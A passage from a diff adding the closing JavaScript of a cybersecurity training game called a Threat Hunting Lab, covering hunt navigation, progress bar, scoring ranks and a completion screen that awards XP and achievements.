+                ${isLast ? 'All hunts complete. View your final assessment.' : `Hunt ${state.huntIndex + 1} complete. Proceed to Hunt ${state.huntIndex + 2}.`}
+            </span>
+            <button class="btn btn-primary" onclick="${isLast ? 'showCompletion()' : 'nextHunt()'}">
+                ${isLast ? 'View Results' : 'Next Hunt &rarr;'}
+            </button>
+        </div>
+    `;
+
+    bottom.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+/* ============================================================
+   NAVIGATION
+============================================================ */
+function nextHunt() {
+    if (state.huntIndex < HUNTS.length - 1) {
+        /* Mark current step complete */
+        const stepEl = document.getElementById(`step-${state.huntIndex}`);
+        if (stepEl) stepEl.classList.replace('active', 'complete');
+        renderHunt(state.huntIndex + 1);
+        /* Mark new step active */
+        const nextStep = document.getElementById(`step-${state.huntIndex}`);
+        if (nextStep) nextStep.classList.add('active');
+        /* Scroll to top */
+        document.getElementById('right-top').scrollTop = 0;
+        document.querySelector('.left-panel').scrollTop = 0;
+    }
+}
+
+/* ============================================================
+   PROGRESS BAR
+============================================================ */
+function updateProgressBar() {
+    for (let i = 0; i < 5; i++) {
+        const step = document.getElementById(`step-${i}`);
+        if (!step) continue;
+        step.className = 'hunt-step';
+        if (i < state.huntIndex)     step.classList.add('complete');
+        else if (i === state.huntIndex) step.classList.add('active');
+    }
+}
+
+function updateScoreDisplay() {
+    document.getElementById('score-display').textContent = `SCORE: ${Math.max(0, state.score)}`;
+}
+
+/* ============================================================
+   COMPLETION SCREEN
+============================================================ */
+function showCompletion() {
+    /* Mark final step complete */
+    const lastStep = document.getElementById(`step-${state.huntIndex}`);
+    if (lastStep) lastStep.classList.replace('active', 'complete');
+
+    const totalScore = Math.max(0, state.score);
+    const pct = Math.round((totalScore / state.maxScore) * 100);
+
+    let rank;
+    if (pct >= 90)      rank = 'APT HUNTER ELITE';
+    else if (pct >= 75) rank = 'THREAT HUNTER';
+    else if (pct >= 50) rank = 'THREAT ANALYST';
+    else                rank = 'INCIDENT RESPONDER';
+
+    document.getElementById('comp-rank').textContent     = rank;
+    document.getElementById('comp-score').textContent    = totalScore;
+    document.getElementById('comp-max').textContent      = state.maxScore;
+    document.getElementById('comp-flags').textContent    = state.correctFlags;
+    document.getElementById('comp-wrong').textContent    = state.wrongFlags;
+    document.getElementById('comp-qcorrect').textContent = `${state.questionsCorrect} / ${state.questionsTotal}`;
+
+    const screen = document.getElementById('completion-screen');
+    screen.classList.add('show');
+
+    /* Animate score bar */
+    setTimeout(() => {
+        document.getElementById('comp-bar').style.width = `${pct}%`;
+    }, 100);
+
+    /* XP and achievement */
+    let xpMsg = '';
+    if (!localStorage.getItem('game_threathunting_xp_awarded')) {
+        const currentXP = parseInt(localStorage.getItem('hexworth_xp') || '0');
+        localStorage.setItem('hexworth_xp', (currentXP + 100).toString());
+        localStorage.setItem('game_threathunting_xp_awarded', 'true');
+        if (typeof FirestoreManager !== 'undefined' && FirestoreManager.addXP) {
+            const uid = localStorage.getItem('hexworth_uid');
+            if (uid) FirestoreManager.addXP(uid, 100, 'Threat Hunting Lab Complete');
+        }
+        xpMsg = '+100 XP AWARDED';
+    } else {
+        xpMsg = 'XP ALREADY AWARDED FOR THIS GAME';
+    }
+    document.getElementById('comp-xp').textContent = xpMsg;
+
+    if (typeof AchievementManager !== 'undefined') {
+        AchievementManager.unlock('game_threathunting');
+    }
+    if (typeof GameTracker !== 'undefined') {
+        GameTracker.record('threathunting', {
+            score: totalScore,
+            maxScore: state.maxScore,
+            rank: rank
+        });
+    }
+}
+
+function closeCompletion() {
+    document.getElementById('completion-screen').classList.remove('show');
+}
+
+/* ============================================================
+   BOOT
+============================================================ */
+document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
